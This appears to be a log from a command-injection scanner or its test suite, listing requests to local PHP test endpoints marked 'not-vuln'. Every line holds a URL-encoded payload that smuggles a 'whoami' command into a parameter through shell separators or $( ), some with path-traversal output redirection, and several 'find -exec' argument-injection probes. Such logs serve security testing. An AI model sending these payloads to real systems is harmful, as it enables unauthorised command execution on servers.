17:19:08,579 root INFO http://localhost:5001/not-vuln/echo.php?host=%26%26whoami%3E..%2F1dc4ca40-82c2-4608-b753-e86f119a6889.tmp
17:19:08,580 root INFO http://localhost:5001/not-vuln/echo.php?host=localhost%26%26whoami
17:19:08,582 root INFO http://localhost:5002/not-vuln/echo.php?host=localhost%26%26whoami%3E..%2Fb4603e49-838f-4503-aed0-58b0da35742d.tmp
17:19:08,582 root INFO http://localhost:5001/not-vuln/echo.php?host=%7Cwhoami
17:19:08,583 root INFO http://localhost:5001/not-vuln/echo.php?host=%7Cwhoami%3E..%2F594a436e-f9a1-49d7-b4eb-dad827b78b8c.tmp
17:19:08,584 root INFO http://localhost:5002/not-vuln/echo.php?host=localhost%7Cwhoami
17:19:08,585 root INFO http://localhost:5001/not-vuln/echo.php?host=localhost%7Cwhoami%3E..%2F913df174-f32c-458e-8ef2-b4dd8219c2f9.tmp
17:19:08,586 root INFO http://localhost:5000/not-vuln/echo.php?host=%7C%7Cwhoami
17:19:08,587 root INFO http://localhost:5001/not-vuln/echo.php?host=%7C%7Cwhoami%3E..%2Fed167a1c-afd7-474c-8bfd-11bb7c470161.tmp
17:19:08,588 root INFO http://localhost:5000/not-vuln/echo.php?host=localhost%7C%7Cwhoami
17:19:08,589 root INFO http://localhost:5001/not-vuln/echo.php?host=localhost%7C%7Cwhoami%3E..%2F59d8fcc8-855a-46a2-bc17-9e2781f059db.tmp
17:19:08,590 root INFO http://localhost:5002/not-vuln/echo.php?host=%24%28whoami%29
17:19:08,591 root INFO http://localhost:5002/not-vuln/echo.php?host=%24%28whoami%29%3E..%2Ff7b0162e-f721-4e5a-8e0e-947f16a52f55.tmp
17:19:08,591 root INFO http://localhost:5002/not-vuln/echo.php?host=localhost%24%28whoami%29
17:19:08,591 root INFO http://localhost:5002/not-vuln/echo.php?host=localhost%24%28whoami%29%3E..%2F5bafcd64-4658-4ea1-9b03-0285f805dc6e.tmp
17:19:08,592 root INFO http://localhost:5000/not-vuln/echo.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
17:19:08,650 root INFO http://localhost:5000/not-vuln/echo-name.php?host=%3Bwhoami
17:19:08,651 root INFO http://localhost:5000/not-vuln/echo-name.php?host=%3Bwhoami%3E..%2F26256215-15de-46de-9eb5-d0a1995385ac.tmp
17:19:08,652 root INFO http://localhost:5001/not-vuln/echo-name.php?host=localhost%3Bwhoami
17:19:08,653 root INFO http://localhost:5002/not-vuln/echo-name.php?host=localhost%3Bwhoami%3E..%2Fd85d1f9b-b164-4a9c-b6e2-fcbb4350f59d.tmp
17:19:08,655 root INFO http://localhost:5000/not-vuln/echo-name.php?host=%26whoami
17:19:08,656 root INFO http://localhost:5000/not-vuln/echo-name.php?host=%26whoami%3E..%2Fee13fcb6-d954-4ba6-9d5e-ff0530dcda5a.tmp
17:19:08,657 root INFO http://localhost:5000/not-vuln/echo-name.php?host=localhost%26whoami
17:19:08,658 root INFO http://localhost:5002/not-vuln/echo-name.php?host=localhost%26whoami%3E..%2Fb33025ba-e15f-48e9-b71f-fbc311ef603e.tmp
17:19:08,659 root INFO http://localhost:5001/not-vuln/echo-name.php?host=%26%26whoami
17:19:08,660 root INFO http://localhost:5001/not-vuln/echo-name.php?host=%26%26whoami%3E..%2F41a59596-9d80-4e28-b219-f9969d72827e.tmp
17:19:08,660 root INFO http://localhost:5001/not-vuln/echo-name.php?host=localhost%26%26whoami
17:19:08,662 root INFO http://localhost:5002/not-vuln/echo-name.php?host=localhost%26%26whoami%3E..%2F25e13796-fa2a-4bb8-8002-a4832c811c73.tmp
17:19:08,662 root INFO http://localhost:5000/not-vuln/echo-name.php?host=%7Cwhoami
17:19:08,663 root INFO http://localhost:5002/not-vuln/echo-name.php?host=%7Cwhoami%3E..%2Fa2876044-c8dd-445e-a9f4-b053dc3aaa8b.tmp
17:19:08,664 root INFO http://localhost:5002/not-vuln/echo-name.php?host=localhost%7Cwhoami
17:19:08,664 root INFO http://localhost:5000/not-vuln/echo-name.php?host=localhost%7Cwhoami%3E..%2Fe0d1894c-b571-4605-8efc-65552335562f.tmp
17:19:08,665 root INFO http://localhost:5002/not-vuln/echo-name.php?host=%7C%7Cwhoami
17:19:08,665 root INFO http://localhost:5001/not-vuln/echo-name.php?host=%7C%7Cwhoami%3E..%2Fcbb11b4d-b254-4acc-85b2-4e3bfbb9f405.tmp
17:19:08,665 root INFO http://localhost:5001/not-vuln/echo-name.php?host=localhost%7C%7Cwhoami
17:19:08,666 root INFO http://localhost:5001/not-vuln/echo-name.php?host=localhost%7C%7Cwhoami%3E..%2F40c22f54-9e35-4fa8-9696-4ec32c4bd7e0.tmp
17:19:08,666 root INFO http://localhost:5000/not-vuln/echo-name.php?host=%24%28whoami%29
17:19:08,667 root INFO http://localhost:5002/not-vuln/echo-name.php?host=%24%28whoami%29%3E..%2F7e08ca75-234e-483a-90b1-95efbb1a3291.tmp
17:19:08,667 root INFO http://localhost:5000/not-vuln/echo-name.php?host=localhost%24%28whoami%29
17:19:08,667 root INFO http://localhost:5000/not-vuln/echo-name.php?host=localhost%24%28whoami%29%3E..%2Fc20d1390-d832-41fa-9cf7-3c80f7c84cad.tmp
17:19:08,667 root INFO http://localhost:5001/not-vuln/echo-name.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
17:19:08,698 root INFO http://localhost:5001/not-vuln/ping-escapeshellcmd.php?host=localhost
17:19:08,699 root INFO http://localhost:5002/not-vuln/ping-escapeshellcmd.php?host=%3Bwhoami
17:19:08,699 root INFO http://localhost:5000/not-vuln/ping-escapeshellcmd.php?host=%3Bwhoami%3E..%2Fc4844fbd-7f26-45c9-a56a-114f6175bb9a.tmp
17:19:08,700 root INFO http://localhost:5000/not-vuln/ping-escapeshellcmd.php?host=localhost%3Bwhoami
17:19:08,700 root INFO http://localhost:5000/not-vuln/ping-escapeshellcmd.php?host=localhost%3Bwhoami%3E..%2F8fbdc546-ae51-4084-bbab-b7f1759e8ebf.tmp
17:19:08,701 root INFO http://localhost:5002/not-vuln/ping-escapeshellcmd.php?host=%26whoami
17:19:08,701 root INFO http://localhost:5001/not-vuln/ping-escapeshellcmd.php?host=%26whoami%3E..%2Ff4a2086b-e19a-4258-b630-b63dc1767522.tmp
17:19:08,702 root INFO http://localhost:5001/not-vuln/ping-escapeshellcmd.php?host=localhost%26whoami
17:19:08,702 root INFO http://localhost:5002/not-vuln/ping-escapeshellcmd.php?host=localhost%26whoami%3E..%2F65588c6c-9ea2-49fb-98cb-7cc2eacca792.tmp
17:19:08,703 root INFO http://localhost:5002/not-vuln/ping-escapeshellcmd.php?host=%26%26whoami
17:19:08,703 root INFO http://localhost:5001/not-vuln/ping-escapeshellcmd.php?host=%26%26whoami%3E..%2F9a84ca80-cb3e-464b-a8ab-86254cb64520.tmp
17:19:08,704 root INFO http://localhost:5002/not-vuln/ping-escapeshellcmd.php?host=localhost%26%26whoami
17:19:08,704 root INFO http://localhost:5002/not-vuln/ping-escapeshellcmd.php?host=localhost%26%26whoami%3E..%2Ff8d6d202-c428-456f-8901-facbf11b90f0.tmp
17:19:08,705 root INFO http://localhost:5000/not-vuln/ping-escapeshellcmd.php?host=%7Cwhoami
17:19:08,706 root INFO http://localhost:5001/not-vuln/ping-escapeshellcmd.php?host=%7Cwhoami%3E..%2F07f32c19-6b30-419f-ad71-9dda5c8ee291.tmp
17:19:08,706 root INFO http://localhost:5000/not-vuln/ping-escapeshellcmd.php?host=localhost%7Cwhoami
17:19:08,706 root INFO http://localhost:5002/not-vuln/ping-escapeshellcmd.php?host=localhost%7Cwhoami%3E..%2F3f609c88-0338-40a8-a496-e5a23dc8aa31.tmp
17:19:08,707 root INFO http://localhost:5002/not-vuln/ping-escapeshellcmd.php?host=%7C%7Cwhoami
17:19:08,707 root INFO http://localhost:5001/not-vuln/ping-escapeshellcmd.php?host=%7C%7Cwhoami%3E..%2F712dc284-880d-446f-9d8e-ee25179b65fc.tmp
17:19:08,707 root INFO http://localhost:5001/not-vuln/ping-escapeshellcmd.php?host=localhost%7C%7Cwhoami
17:19:08,708 root INFO http://localhost:5002/not-vuln/ping-escapeshellcmd.php?host=localhost%7C%7Cwhoami%3E..%2F73d46c0f-2c6b-49fe-bcc4-c16f00e059db.tmp
17:19:08,708 root INFO http://localhost:5000/not-vuln/ping-escapeshellcmd.php?host=%24%28whoami%29
17:19:08,708 root INFO http://localhost:5001/not-vuln/ping-escapeshellcmd.php?host=%24%28whoami%29%3E..%2F6904e30a-76c3-4766-a19d-f185b0437a81.tmp
17:19:08,709 root INFO http://localhost:5000/not-vuln/ping-escapeshellcmd.php?host=localhost%24%28whoami%29
17:19:08,710 root INFO http://localhost:5000/not-vuln/ping-escapeshellcmd.php?host=localhost%24%28whoami%29%3E..%2Fab0d26ed-67f0-40b1-9f7f-431bdaad05f5.tmp
17:19:08,710 root INFO http://localhost:5001/not-vuln/ping-escapeshellcmd.php?input=find-escapeshellcmd.php+-exec+whoami+%3B
